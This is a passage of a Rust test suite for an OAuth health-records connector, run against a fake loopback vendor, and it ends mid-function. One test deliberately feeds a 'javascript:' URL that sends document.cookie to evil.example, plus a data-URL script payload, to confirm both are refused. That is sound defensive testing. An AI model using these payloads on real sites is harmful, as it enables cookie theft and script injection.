//! The connector OAuth core (connectors.md 6.2) against a fake vendor on loopback: launch and
//! callback refusals, the three client credentials, atomic refresh-token rotation, reconsent,
//! disconnect, revocation before a profile delete, and the declared-host check. Synthetic data only
//! (the Rivera family, the fictional LabNorte hospital).

mod common;
mod connector_fake;

use chrono::{DateTime, Duration, TimeZone, Utc};
use common::{R, family};
use connector_fake::{Behaviour, CLIENT_ID, CLIENT_SECRET, Fake, PATIENT, REDIRECT, param};
use ownhealth_core::connector_oauth::{
    self as oauth, ClientAuth, ConnectorClient, Endpoints, Launch, OAuthError, Revocation, SourceHttp, TokenSet,
};
use ownhealth_core::demo::Family;
use ownhealth_core::keys::{Kek, Keyring};
use ownhealth_core::net::Egress;
use ownhealth_core::secrets::{SecretBox, SecretString, read_secret, replace_secret, store_secret};
use ownhealth_core::testing::{TestDb, random_secrets_key};
use serde_json::Value;
use uuid::Uuid;

const BINDER: &str = "binder-of-alex-browser-0001";
/// The cap a profile delete gives each revocation in these tests.
const CAP: std::time::Duration = std::time::Duration::from_secs(5);

/// The fake is plain http on loopback: only these two fields widen, the rest is the connector profile.
fn egress() -> Egress {
    Egress {
        allow_private: true,
        https_only: false,
        ..Egress::connector()
    }
}

fn t0() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 11, 22, 8, 0, 0)
        .single()
        .expect("a fixed instant")
}

struct Setup {
    db: TestDb,
    sb: SecretBox,
    /// The key that wraps the profile keys, to start another keyring on the same database.
    kek: Kek,
    fam: Family,
    fake: Fake,
    client: ConnectorClient,
    endpoints: Endpoints,
}

/// A household client at the fake: public (`None`) or with a secret sent as `auth`.
async fn setup_with(auth: Option<ClientAuth>) -> anyhow::Result<Setup> {
    let db = TestDb::new().await?;
    let mut c = db.pool.acquire().await?;
    let fam = family(&mut c).await?;
    let kek = Kek::from_base64(&random_secrets_key())?;
    let sb =
        SecretBox::new(&[5u8; 32])?.with_keys(Some(std::sync::Arc::new(Keyring::new(kek.clone(), db.url.clone()))));
    let fake = Fake::start().await;
    let secret = match auth {
        Some(_) => Some(
            store_secret(
                &mut c,
                &sb,
                fam.household_id,
                "connector_client_secret",
                Some("Hospital LabNorte"),
                &SecretString::new(CLIENT_SECRET),
            )
            .await?,
        ),
        None => None,
    };
    let id: Uuid = sqlx::query_scalar(
        "insert into connector_client (household_id, vendor, issuer, client_id, client_secret_id, redirect_uri) \
         values ($1, 'labnorte-ehr', $2, $3, $4, $5) returning id",
    )
    .bind(fam.household_id)
    .bind(fake.issuer())
    .bind(CLIENT_ID)
    .bind(secret)
    .bind(REDIRECT)
    .fetch_one(&mut *c)
    .await?;
    let client = oauth::load_client(&mut c, Some(&sb), fam.household_id, id)
        .await?
        .expect("the client");
    let spec = oauth::kind_spec("smart").expect("smart is served");
    let mut endpoints = oauth::resolve(&spec, &fake.issuer(), &egress()).await?;
    if let Some(a) = auth {
        endpoints.auth = a;
    }
    drop(c);
    Ok(Setup {
        db,
        sb,
        kek,
        fam,
        fake,
        client,
        endpoints,
    })
}

async fn setup() -> anyhow::Result<Setup> {
    setup_with(Some(ClientAuth::Basic)).await
}

impl Setup {
    fn alex(&self) -> Uuid {
        self.fam.profile("alex")
    }

    async fn launch(&self, source_id: Option<Uuid>) -> anyhow::Result<String> {
        let mut c = self.db.pool.acquire().await?;
        Ok(oauth::begin(
            &mut c,
            &Launch {
                kind: "smart",
                client: &self.client,
                endpoints: &self.endpoints,
                profile_id: self.alex(),
                label: "Hospital LabNorte",
                source_id,
                user_id: Some(self.fam.user("alex")),
                session_id: None,
                binder: BINDER,
            },
        )
        .await?
        .url)
    }

    /// Launch, consent at the fake, call back and save: a connected source.
    async fn connect(&self, source_id: Option<Uuid>, now: DateTime<Utc>) -> anyhow::Result<(Uuid, TokenSet)> {
        let url = self.launch(source_id).await?;
        let code = self.fake.consent(&url);
        let mut c = self.db.pool.acquire().await?;
        let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
        let t = oauth::exchange(&p, &self.client, &code, &egress()).await?;
        let id = oauth::save_connection(&mut c, &self.sb, &p, &self.client, &t, now).await?;
        Ok((id, t))
    }

    async fn refresh(&self, id: Uuid, now: DateTime<Utc>) -> Result<SecretString, OAuthError> {
        oauth::access_token(&self.db.pool, &self.sb, id, &egress(), now).await
    }

    async fn refresh_token(&self, id: Uuid) -> anyhow::Result<Option<String>> {
        let mut c = self.db.pool.acquire().await?;
        let secret: Option<Uuid> = sqlx::query_scalar("select secret_id from source where id = $1")
            .bind(id)
            .fetch_one(&mut *c)
            .await?;
        Ok(match secret {
            Some(s) => Some(
                read_secret(&mut c, &self.sb, self.fam.household_id, s)
                    .await?
                    .expose()
                    .to_string(),
            ),
            None => None,
        })
    }

    async fn reconsent(&self, id: Uuid) -> anyhow::Result<Option<DateTime<Utc>>> {
        Ok(
            sqlx::query_scalar("select reconsent_needed_at from source where id = $1")
                .bind(id)
                .fetch_one(&self.db.pool)
                .await?,
        )
    }

    async fn count(&self, sql: &str) -> anyhow::Result<i64> {
        Ok(sqlx::query_scalar(sqlx::AssertSqlSafe(sql.to_string()))
            .fetch_one(&self.db.pool)
            .await?)
    }
}

/// kind, config, access_expires_at, reconsent_needed_at, poll_seconds, enabled
type SourceRow = (
    String,
    Value,
    Option<DateTime<Utc>>,
    Option<DateTime<Utc>>,
    Option<i32>,
    bool,
);

fn refused_code(r: Result<impl std::fmt::Debug, OAuthError>) -> String {
    match r {
        Err(OAuthError::Refused { code, .. }) => code.into(),
        other => format!("not refused: {other:?}"),
    }
}

// ------------------------------------------------------------------ launch ----

#[tokio::test]
async fn the_authorize_url_carries_pkce_s256_a_long_state_and_the_audience() -> R {
    let s = setup().await?;
    let url = s.launch(None).await?;
    assert!(url.starts_with(&format!("{}/authorize?", s.fake.base)), "{url}");
    let state = param(&url, "state").unwrap_or_default();
    assert!(state.len() >= 16, "state {state:?}");
    assert_eq!(param(&url, "code_challenge_method").as_deref(), Some("S256"));
    assert_eq!(param(&url, "code_challenge").map(|c| c.len()), Some(43));
    assert_eq!(param(&url, "response_type").as_deref(), Some("code"));
    assert_eq!(param(&url, "client_id").as_deref(), Some(CLIENT_ID));
    assert!(param(&url, "aud").is_some_and(|a| a.contains("127.0.0.1")), "{url}");
    assert!(
        param(&url, "scope").is_some_and(|a| a.contains("offline_access")),
        "{url}"
    );
    assert!(!url.contains("verifier"), "{url}");
    // the challenge row: purpose connector, the binder kept only as its hash
    let data: Value =
        sqlx::query_scalar("select data from auth_challenge where challenge = $1 and purpose = 'connector'")
            .bind(state.as_bytes())
            .fetch_one(&s.db.pool)
            .await?;
    assert_eq!(data["binder"], oauth::binder_hash(BINDER).as_str());
    assert!(!data.to_string().contains(BINDER), "the binder is stored in clear");
    // a launch with no binder is refused before anything is stored
    let mut c = s.db.pool.acquire().await?;
    let r = oauth::begin(
        &mut c,
        &Launch {
            kind: "smart",
            client: &s.client,
            endpoints: &s.endpoints,
            profile_id: s.alex(),
            label: "Hospital LabNorte",
            source_id: None,
            user_id: None,
            session_id: None,
            binder: "",
        },
    )
    .await;
    assert_eq!(refused_code(r), "bad_binder");
    Ok(())
}

#[tokio::test]
async fn a_server_without_s256_is_refused() -> R {
    let s = setup().await?;
    s.fake.set(|b| b.s256 = false);
    let spec = oauth::kind_spec("smart").expect("smart");
    match oauth::resolve(&spec, &s.fake.issuer(), &egress()).await {
        Err(OAuthError::Vendor { code, .. }) => assert_eq!(code, "no_pkce_s256"),
        other => panic!("accepted a server without PKCE S256: {other:?}"),
    }
    // and the connector profile itself never reaches a loopback vendor: plain http is refused
    // before any request
    let before = s.fake.book().requests;
    assert_eq!(
        refused_code(oauth::resolve(&spec, &s.fake.issuer(), &Egress::connector()).await),
        "bad_issuer"
    );
    let https = s.fake.issuer().replace("http://", "https://");
    assert!(matches!(
        oauth::resolve(&spec, &https, &Egress::connector()).await,
        Err(OAuthError::Net(_))
    ));
    assert_eq!(s.fake.book().requests, before);
    Ok(())
}

/// A sign-in page the browser is sent to, and every address the server names for tokens: https with a
/// host and no user name (plain http only to loopback, where the egress allows plain http). Anything
/// else is refused before an authorize URL exists.
#[tokio::test]
async fn a_server_naming_a_script_or_data_url_as_an_endpoint_is_refused() -> R {
    let s = setup().await?;
    let spec = oauth::kind_spec("smart").expect("smart");
    let js = "javascript:fetch(\"https://evil.example/\"+document.cookie)//";
    let data = "data:text/html,<script>alert(1)</script>";
    let plain = "http://login.evil.example/authorize";
    let userinfo = format!("{}/authorize", s.fake.base.replace("http://", "http://alex:pw@"));
    let cases: [(&str, &str); 9] = [
        ("authorize", js),
        ("authorize", data),
        ("authorize", plain),
        ("authorize", &userinfo),
        ("token", js),
        ("token", data),
        ("token", plain),
        ("revoke", js),
        ("revoke", data),
    ];
    for (field, url) in cases {
        s.fake.set(|b| {
            *b = Behaviour::default();
            let bad = Some(url.to_string());
            match field {
                "authorize" => b.authorize_url = bad,
                "token" => b.token_url = bad,
                _ => b.revoke_url = bad,
            }
        });
        assert_eq!(
            refused_code(oauth::resolve(&spec, &s.fake.issuer(), &egress()).await),
            "bad_endpoint",
            "{field} {url}"
        );
    }
    // the server a person names follows the same rule, and nothing is fetched from it
    s.fake.set(|b| *b = Behaviour::default());
    let before = s.fake.book().requests;
    let typed_userinfo = s.fake.issuer().replace("http://", "http://alex:pw@");
    for issuer in [js, data, "http://fhir.evil.example/r4", &typed_userinfo] {
        assert_eq!(
            refused_code(oauth::resolve(&spec, issuer, &egress()).await),
            "bad_issuer",
            "{issuer}"
        );
    }
    assert_eq!(
        s.fake.book().requests,
        before,
        "a refused server was asked for its endpoints"
    );
    // the reverse: the fake's own endpoints pass
    assert!(oauth::resolve(&spec, &s.fake.issuer(), &egress()).await.is_ok());
    // and a launch never builds a sign-in URL from a stored address that is not a web address
    let mut bad = s.endpoints.clone();
    bad.authorize = js.into();
    let mut c = s.db.pool.acquire().await?;
    let r = oauth::begin(
        &mut c,
        &Launch {
            kind: "smart",
            client: &s.client,
            endpoints: &bad,
            profile_id: s.alex(),
            label: "Hospital LabNorte",
            source_id: None,
            user_id: None,
            session_id: None,
            binder: BINDER,
        },
    )
    .await;
    assert_eq!(refused_code(r), "bad_endpoint");
    Ok(())
}

#[tokio::test]
async fn a_state_is_single_use_short_lived_and_bound_to_its_browser() -> R {
    let s = setup().await?;
    let mut c = s.db.pool.acquire().await?;
    // another browser: refused, and the state is used up all the same
    let url = s.launch(None).await?;
    let state = param(&url, "state").unwrap_or_default();
    assert_eq!(
        refused_code(oauth::take_state(&mut c, &state, "binder-of-someone-else-01").await),
        "wrong_browser"
    );
    assert_eq!(
        refused_code(oauth::take_state(&mut c, &state, BINDER).await),
        "state_invalid"
    );
    // no binder at all
    let url = s.launch(None).await?;
    let state = param(&url, "state").unwrap_or_default();
    assert_eq!(
        refused_code(oauth::take_state(&mut c, &state, "").await),
        "wrong_browser"
    );
    // replayed
    let url = s.launch(None).await?;
    let state = param(&url, "state").unwrap_or_default();
    oauth::take_state(&mut c, &state, BINDER).await?;
    assert_eq!(
        refused_code(oauth::take_state(&mut c, &state, BINDER).await),
        "state_invalid"
    );
    // expired
    let url = s.launch(None).await?;
    let state = param(&url, "state").unwrap_or_default();
    sqlx::query("update auth_challenge set expires_at = now() - interval '1 second' where challenge = $1")
        .bind(state.as_bytes())
        .execute(&mut *c)
        .await?;
    assert_eq!(
        refused_code(oauth::take_state(&mut c, &state, BINDER).await),
        "state_invalid"
    );
    // another step's state (an OIDC login) is not a connector launch, and it is left alone
    sqlx::query(
        "insert into auth_challenge (purpose, challenge, data, expires_at) values ('oidc', $1, '{}', now() + interval '5 minutes')",
    )
    .bind(b"an-oidc-state-of-the-same-length".as_slice())
    .execute(&mut *c)
    .await?;
    assert_eq!(
        refused_code(oauth::take_state(&mut c, "an-oidc-state-of-the-same-length", BINDER).await),
        "state_invalid"
    );
    let left = s
        .count("select count(*) from auth_challenge where purpose = 'oidc' and used_at is null")
        .await?;
    assert_eq!(left, 1);
    assert_eq!(s.count("select count(*) from source").await?, 0);
    Ok(())
}

#[tokio::test]
async fn a_code_issued_for_another_verifier_is_refused_and_nothing_is_saved() -> R {
    let s = setup().await?;
    let url = s.launch(None).await?;
    let mut c = s.db.pool.acquire().await?;
    let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
    // a code the attacker got with their own PKCE challenge, injected into this callback
    let other = s.launch(None).await?;
    let injected = s.fake.consent(&other);
    match oauth::exchange(&p, &s.client, &injected, &egress()).await {
        Err(OAuthError::Vendor { status, code }) => assert_eq!((status, code.as_str()), (400, "invalid_grant")),
        other => panic!("an injected code was exchanged: {other:?}"),
    }
    assert_eq!(s.count("select count(*) from source").await?, 0);
    assert_eq!(
        s.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        0
    );
    Ok(())
}

#[tokio::test]
async fn a_launch_for_another_households_profile_is_not_saved() -> R {
    let s = setup().await?;
    let mut c = s.db.pool.acquire().await?;
    let ortega = family(&mut c).await?;
    let url = oauth::begin(
        &mut c,
        &Launch {
            kind: "smart",
            client: &s.client,
            endpoints: &s.endpoints,
            profile_id: ortega.profile("carmen"),
            label: "Hospital LabNorte",
            source_id: None,
            user_id: Some(s.fam.user("alex")),
            session_id: None,
            binder: BINDER,
        },
    )
    .await?
    .url;
    let code = s.fake.consent(&url);
    let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
    let t = oauth::exchange(&p, &s.client, &code, &egress()).await?;
    let r = oauth::save_connection(&mut c, &s.sb, &p, &s.client, &t, t0()).await;
    assert_eq!(refused_code(r), "wrong_household");
    assert_eq!(s.count("select count(*) from source").await?, 0);
    Ok(())
}

// ------------------------------------------------------------- credentials ----

#[tokio::test]
async fn the_code_is_exchanged_as_a_public_a_basic_and_a_post_client() -> R {
    for (auth, seen) in [
        (None, "public"),
        (Some(ClientAuth::Basic), "basic"),
        (Some(ClientAuth::Post), "post"),
    ] {
        let s = setup_with(auth).await?;
        let (id, t) = s.connect(None, t0()).await?;
        assert_eq!(s.fake.book().auth_seen, vec![seen.to_string()], "{auth:?}");
        assert!(t.refresh.is_some());
        // the refresh speaks the same way
        s.refresh(id, t0() + Duration::hours(2)).await?;
        assert_eq!(
            s.fake.book().auth_seen,
            vec![seen.to_string(), seen.to_string()],
            "{auth:?}"
        );
    }
    Ok(())
}

#[tokio::test]
async fn a_token_answer_that_is_not_bearer_is_refused_and_nothing_is_saved() -> R {
    let s = setup().await?;
    s.fake.set(|b| b.token_type = "mac".into());
    let url = s.launch(None).await?;
    let code = s.fake.consent(&url);
    let mut c = s.db.pool.acquire().await?;
    let p = oauth::take_state(&mut c, &param(&url, "state").unwrap_or_default(), BINDER).await?;
    match oauth::exchange(&p, &s.client, &code, &egress()).await {
        Err(OAuthError::Vendor { code, .. }) => assert_eq!(code, "not_bearer"),
        other => panic!("a mac token was accepted: {other:?}"),
    }
    assert_eq!(s.count("select count(*) from source").await?, 0);
    assert_eq!(
        s.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        0
    );
    // the reverse: the type is compared without case
    s.fake.set(|b| b.token_type = "bearer".into());
    s.connect(None, t0()).await?;
    assert_eq!(s.count("select count(*) from source").await?, 1);
    Ok(())
}

#[tokio::test]
async fn a_connection_keeps_its_refresh_token_sealed_and_out_of_the_source_row() -> R {
    let s = setup().await?;
    let (id, t) = s.connect(None, t0()).await?;
    let row: SourceRow = sqlx::query_as(
        "select kind, config, access_expires_at, reconsent_needed_at, poll_seconds, enabled from source where id = $1",
    )
    .bind(id)
    .fetch_one(&s.db.pool)
    .await?;
    assert_eq!(row.0, "smart");
    assert_eq!(row.2, Some(t0() + Duration::seconds(3600)));
    assert_eq!((row.3, row.4, row.5), (None, Some(oauth::DEFAULT_POLL_SECONDS), true));
    assert_eq!(row.1["patient"], PATIENT);
    assert_eq!(row.1["hosts"].as_array().map(Vec::len), Some(1), "{}", row.1);
    // no cleartext token in the source, the challenge, or the sealed refresh token
    let whole: String = sqlx::query_scalar("select row_to_json(s)::text from source s where id = $1")
        .bind(id)
        .fetch_one(&s.db.pool)
        .await?;
    let challenges: String = sqlx::query_scalar("select coalesce(string_agg(data::text, ' '), '') from auth_challenge")
        .fetch_one(&s.db.pool)
        .await?;
    let sealed: Vec<Vec<u8>> =
        sqlx::query_scalar("select ciphertext from secret where purpose = 'connector_refresh_token'")
            .fetch_all(&s.db.pool)
            .await?;
    assert_eq!(sealed.len(), 1);
    for token in s.fake.book().handed_out.clone() {
        assert!(
            !whole.contains(&token) && !challenges.contains(&token),
            "{token} is stored in clear"
        );
        assert!(!sealed[0].windows(token.len()).any(|w| w == token.as_bytes()));
    }
    assert_eq!(
        s.refresh_token(id).await?.as_deref(),
        t.refresh.as_ref().map(SecretString::expose)
    );
    // nothing prints a token
    let printed = format!("{t:?}");
    assert!(
        !printed.contains("fake-access") && !printed.contains("fake-refresh"),
        "{printed}"
    );
    Ok(())
}

/// The version byte and profile id a stored secret starts with (version 2 names its profile).
async fn sealed_head(db: &TestDb, secret_id: Uuid) -> anyhow::Result<(u8, Option<Uuid>)> {
    let ct: Vec<u8> = sqlx::query_scalar("select ciphertext from secret where id = $1")
        .bind(secret_id)
        .fetch_one(&db.pool)
        .await?;
    let profile = ct.get(1..17).and_then(|b| Uuid::from_slice(b).ok());
    Ok((ct[0], if ct[0] == 2 { profile } else { None }))
}

async fn secret_of(db: &TestDb, source: Uuid) -> anyhow::Result<Uuid> {
    let id: Option<Uuid> = sqlx::query_scalar("select secret_id from source where id = $1")
        .bind(source)
        .fetch_one(&db.pool)
        .await?;
    id.ok_or_else(|| anyhow::anyhow!("no refresh token held"))
}

#[tokio::test]
async fn a_refresh_token_is_sealed_under_its_profiles_key_and_survives_a_restart_and_a_refresh() -> R {
    let s = setup().await?;
    let (id, t) = s.connect(None, t0()).await?;
    let secret = secret_of(&s.db, id).await?;
    assert_eq!(sealed_head(&s.db, secret).await?, (2, Some(s.alex())));
    // the secrets key alone does not open it: the box needs the profile's key
    let bare = SecretBox::new(&[5u8; 32])?;
    let mut c = s.db.pool.acquire().await?;
    assert!(read_secret(&mut c, &bare, s.fam.household_id, secret).await.is_err());
    drop(c);
    // a restart: a new keyring on the same database and keys opens it, refreshes and seals the new one
    let restarted =
        SecretBox::new(&[5u8; 32])?.with_keys(Some(std::sync::Arc::new(Keyring::new(s.kek.clone(), s.db.url.clone()))));
    let mut c = s.db.pool.acquire().await?;
    let before = read_secret(&mut c, &restarted, s.fam.household_id, secret).await?;
    assert_eq!(Some(before.expose()), t.refresh.as_ref().map(SecretString::expose));
    drop(c);
    oauth::access_token(&s.db.pool, &restarted, id, &egress(), t0() + Duration::hours(2)).await?;
    assert_eq!(sealed_head(&s.db, secret).await?, (2, Some(s.alex())));
    let mut c = s.db.pool.acquire().await?;
    let after = read_secret(&mut c, &restarted, s.fam.household_id, secret).await?;
    assert_ne!(after, before, "the refresh did not rotate the token");
    assert!(s.fake.book().live.contains(after.expose()));
    // the profile's key gone (a delete) leaves the token unreadable
    sqlx::query("update profile_key set wrapped_dek = null, kek_fingerprint = null where profile_id = $1")
        .bind(s.alex())
        .execute(&mut *c)
        .await?;
    let fresh =
        SecretBox::new(&[5u8; 32])?.with_keys(Some(std::sync::Arc::new(Keyring::new(s.kek.clone(), s.db.url.clone()))));
    assert!(read_secret(&mut c, &fresh, s.fam.household_id, secret).await.is_err());
    Ok(())
}

#[tokio::test]
async fn a_token_sealed_under_the_secrets_key_still_works_and_the_next_refresh_seals_it_under_the_profile() -> R {
    let s = setup().await?;
    let (id, _) = s.connect(None, t0()).await?;
    let secret = secret_of(&s.db, id).await?;
    // a row from before slice 46: the same token sealed under the secrets key
    let mut c = s.db.pool.acquire().await?;
    let token = read_secret(&mut c, &s.sb, s.fam.household_id, secret).await?;
    replace_secret(&mut c, &s.sb, secret, &token).await?;
    assert_eq!(sealed_head(&s.db, secret).await?.0, 1);
    assert_eq!(read_secret(&mut c, &s.sb, s.fam.household_id, secret).await?, token);
    drop(c);
    s.refresh(id, t0() + Duration::hours(2)).await?;
    assert_eq!(sealed_head(&s.db, secret).await?, (2, Some(s.alex())));
    let now = s.refresh_token(id).await?.unwrap_or_default();
    assert!(s.fake.book().live.contains(&now));
    Ok(())
}

/// A vendor that never rotates keeps the token it gave at the start: a token sealed under the secrets
/// key before slice 46 is sealed again under the profile's key at the next refresh, once, so a
/// profile delete leaves it unreadable too.
#[tokio::test]
async fn a_token_a_vendor_never_rotates_is_sealed_under_the_profile_at_the_next_refresh() -> R {
    let s = setup().await?;
    s.fake.set(|b| b.rotate = false);
    let (id, _) = s.connect(None, t0()).await?;
    let secret = secret_of(&s.db, id).await?;
    let mut c = s.db.pool.acquire().await?;
    let token = read_secret(&mut c, &s.sb, s.fam.household_id, secret).await?;
    replace_secret(&mut c, &s.sb, secret, &token).await?;
    drop(c);
    assert_eq!(sealed_head(&s.db, secret).await?.0, 1);
    s.refresh(id, t0() + Duration::hours(2)).await?;
    assert_eq!(
        sealed_head(&s.db, secret).await?,
        (2, Some(s.alex())),
        "the token stayed under the secrets key"
    );
    assert_eq!(s.refresh_token(id).await?.as_deref(), Some(token.expose()));
    // sealed once: the next refresh leaves the row as it is
    let before: Vec<u8> = sqlx::query_scalar("select ciphertext from secret where id = $1")
        .bind(secret)
        .fetch_one(&s.db.pool)
        .await?;
    s.refresh(id, t0() + Duration::hours(4)).await?;
    let after: Vec<u8> = sqlx::query_scalar("select ciphertext from secret where id = $1")
        .bind(secret)
        .fetch_one(&s.db.pool)
        .await?;
    assert_eq!(
        before, after,
        "a token already under the profile's key was sealed again"
    );
    Ok(())
}

/// A process that holds no profile keys (a box built without them) never refreshes a profile's
/// connection: the vendor would rotate the refresh token, and the new one could not be stored under
/// the profile's key. It refuses before the request, so the token stays good and no consent is asked.
#[tokio::test]
async fn a_box_without_the_profile_keys_refuses_before_it_spends_the_refresh_token() -> R {
    let s = setup().await?;
    let (id, _) = s.connect(None, t0()).await?;
    let secret = secret_of(&s.db, id).await?;
    // a row from before slice 46, which such a box could read
    let mut c = s.db.pool.acquire().await?;
    let token = read_secret(&mut c, &s.sb, s.fam.household_id, secret).await?;
    replace_secret(&mut c, &s.sb, secret, &token).await?;
    drop(c);
    let keyless = SecretBox::new(&[5u8; 32])?;
    let r = oauth::access_token(&s.db.pool, &keyless, id, &egress(), t0() + Duration::hours(2)).await;
    assert_eq!(refused_code(r), "profile_keys_missing");
    assert_eq!(s.fake.book().refresh_calls, 0, "the refresh token was sent");
    assert_eq!(s.reconsent(id).await?, None);
    // the token is as it was, and a box with the keys refreshes it
    s.refresh(id, t0() + Duration::hours(2)).await?;
    assert_eq!(s.fake.book().refresh_calls, 1);
    Ok(())
}

/// A process whose keyring cannot open the profile's key (another OWNHEALTH_SECRETS_KEY than the one
/// that made it) can still read a token sealed under the secrets key. It opens the profile's key
/// before the request and refuses, so the vendor never rotates a token it could not store.
#[tokio::test]
async fn a_keyring_that_cannot_open_the_profiles_key_refuses_before_it_spends_the_refresh_token() -> R {
    let s = setup().await?;
    let (id, _) = s.connect(None, t0()).await?;
    let secret = secret_of(&s.db, id).await?;
    let mut c = s.db.pool.acquire().await?;
    let token = read_secret(&mut c, &s.sb, s.fam.household_id, secret).await?;
    replace_secret(&mut c, &s.sb, secret, &token).await?;
    drop(c);
    assert_eq!(sealed_head(&s.db, secret).await?.0, 1);
    let other_kek = Kek::from_base64(&random_secrets_key())?;
    let wrong =
        SecretBox::new(&[5u8; 32])?.with_keys(Some(std::sync::Arc::new(Keyring::new(other_kek, s.db.url.clone()))));
    let r = oauth::access_token(&s.db.pool, &wrong, id, &egress(), t0() + Duration::hours(2)).await;
    assert_eq!(refused_code(r), "profile_key_unopened");
    assert_eq!(s.fake.book().refresh_calls, 0, "the refresh token was sent");
    assert_eq!(s.reconsent(id).await?, None);
    assert_eq!(s.refresh_token(id).await?.as_deref(), Some(token.expose()));
    // the token is as it was, and a box with the right keys refreshes it
    s.refresh(id, t0() + Duration::hours(2)).await?;
    assert_eq!(s.fake.book().refresh_calls, 1);
    Ok(())
}

/// An install upgraded from before slice 46 can hold a token sealed under the secrets key for a
/// profile that has no key yet (a connection and no stored file). Its first refresh makes the
/// profile's key, so the refresh goes through and the new token is sealed under that key.
#[tokio::test]
async fn a_profile_with_no_key_yet_gets_one_at_its_first_refresh() -> R {
    let s = setup().await?;
    let (id, _) = s.connect(None, t0()).await?;
    let secret = secret_of(&s.db, id).await?;
    let mut c = s.db.pool.acquire().await?;
    let token = read_secret(&mut c, &s.sb, s.fam.household_id, secret).await?;
    replace_secret(&mut c, &s.sb, secret, &token).await?;
    sqlx::query("delete from profile_key where profile_id = $1")
        .bind(s.alex())
        .execute(&mut *c)
        .await?;
    drop(c);
    assert_eq!(sealed_head(&s.db, secret).await?.0, 1);
    // a process started after the upgrade
    let upgraded =
        SecretBox::new(&[5u8; 32])?.with_keys(Some(std::sync::Arc::new(Keyring::new(s.kek.clone(), s.db.url.clone()))));
    oauth::access_token(&s.db.pool, &upgraded, id, &egress(), t0() + Duration::hours(2)).await?;
    assert_eq!(s.fake.book().refresh_calls, 1);
    assert_eq!(
        sealed_head(&s.db, secret).await?,
        (2, Some(s.alex())),
        "the new token is not sealed under the profile's key"
    );
    let keys: i64 =
        sqlx::query_scalar("select count(*) from profile_key where profile_id = $1 and wrapped_dek is not null")
            .bind(s.alex())
            .fetch_one(&s.db.pool)
            .await?;
    assert_eq!(keys, 1, "the refresh made no key for the profile");
    Ok(())
}

// ----------------------------------------------------------------- refresh ----

#[tokio::test]
async fn thirty_daily_refreshes_rotate_the_token_under_an_injected_clock() -> R {
    let s = setup().await?;
    s.fake.set(|b| b.refresh_expires_in = Some(90 * 86_400));
    let (id, _) = s.connect(None, t0()).await?;
    let first = s.refresh_token(id).await?;
    let mut seen = std::collections::HashSet::new();
    for day in 1..=30 {
        let now = t0() + Duration::days(day);
        let access = s.refresh(id, now).await?;
        assert!(
            seen.insert(access.expose().to_string()),
            "day {day}: an access token came back twice"
        );
        // the same day, the committed token is used again and the vendor is not asked
        assert_eq!(s.refresh(id, now + Duration::minutes(30)).await?, access, "day {day}");
        let expires: (Option<DateTime<Utc>>, Option<DateTime<Utc>>) =
            sqlx::query_as("select access_expires_at, grant_expires_at from source where id = $1")
                .bind(id)
                .fetch_one(&s.db.pool)
                .await?;
        assert_eq!(expires.0, Some(now + Duration::seconds(3600)), "day {day}");
        assert_eq!(expires.1, Some(now + Duration::days(90)), "day {day}");
    }
    {
        let book = s.fake.book();
        assert_eq!(book.refresh_calls, 30);
        assert_eq!(book.live.len(), 1, "only the newest refresh token is alive");
    }
    let last = s.refresh_token(id).await?;
    assert_ne!(first, last);
    assert!(last.is_some_and(|l| s.fake.book().live.contains(&l)));
    assert_eq!(s.reconsent(id).await?, None);
    Ok(())
}

#[tokio::test]
async fn two_concurrent_refreshes_are_serialized_and_the_second_reuses_the_first() -> R {
    let s = setup().await?;
    let (id, _) = s.connect(None, t0()).await?;
    s.fake.set(|b| b.delay_ms = 300);
    let now = t0() + Duration::hours(2);
    let (a, b) = tokio::join!(s.refresh(id, now), s.refresh(id, now));
    let (a, b) = (a?, b?);
    assert_eq!(a, b, "the second refresh did not reuse the first one's token");
    {
        let book = s.fake.book();
        assert_eq!(book.refresh_calls, 1, "the refresh token was sent twice");
        assert_eq!(book.max_in_flight, 1);
    }
    assert_eq!(s.reconsent(id).await?, None);
    // the reverse: two refreshes on two connections do not wait for each other
    let (other, _) = s.connect(None, t0()).await?;
    let later = now + Duration::hours(2);
    let (x, y) = tokio::join!(s.refresh(id, later), s.refresh(other, later));
    x?;
    y?;
    assert_eq!(s.fake.book().max_in_flight, 2, "two connections were serialized");
    Ok(())
}

#[tokio::test]
async fn a_reused_refresh_token_gives_invalid_grant_and_the_connection_asks_for_consent() -> R {
    let s = setup().await?;
    let (id, t) = s.connect(None, t0()).await?;
    s.refresh(id, t0() + Duration::hours(2)).await?;
    // an old copy of the token comes back (a restored backup): the vendor already retired it
    let secret: Uuid = sqlx::query_scalar("select secret_id from source where id = $1")
        .bind(id)
        .fetch_one(&s.db.pool)
        .await?;
    let mut c = s.db.pool.acquire().await?;
    replace_secret(&mut c, &s.sb, secret, t.refresh.as_ref().expect("a refresh token")).await?;
    let now = t0() + Duration::hours(4);
    let err = s.refresh(id, now).await.expect_err("a reused token worked");
    assert!(matches!(err, OAuthError::ReconsentNeeded), "{err:?}");
    // the vendor's description quotes the token; our message does not
    let text = format!("{err} {err:?}");
    assert!(!text.contains("fake-refresh"), "{text}");
    assert_eq!(s.reconsent(id).await?, Some(now));
    // from now on nothing is sent until the person connects again
    let calls = s.fake.book().refresh_calls;
    assert!(matches!(
        s.refresh(id, now + Duration::hours(1)).await,
        Err(OAuthError::ReconsentNeeded)
    ));
    assert_eq!(s.fake.book().refresh_calls, calls);
    // reconnect clears it and replaces the token in the same secret row
    let (again, t2) = s.connect(Some(id), now + Duration::hours(2)).await?;
    assert_eq!(again, id);
    assert_eq!(s.reconsent(id).await?, None);
    assert_eq!(
        s.refresh_token(id).await?.as_deref(),
        t2.refresh.as_ref().map(SecretString::expose)
    );
    assert_eq!(
        s.count("select count(*) from secret where purpose = 'connector_refresh_token'")
            .await?,
        1
    );
    assert_eq!(s.count("select count(*) from source").await?, 1);
    s.refresh(id, now + Duration::hours(5)).await?;
    Ok(())
}

#[tokio::test]
async fn a_failing_vendor_keeps_the_token_and_says_so_without_asking_for_consent() -> R {
    let s = setup().await?;
    let (id, t) = s.connect(None, t0()).await?;
    s.fake.set(|b| b.fail_refresh = Some(503));
    match s.refresh(id, t0() + Duration::hours(2)).await {
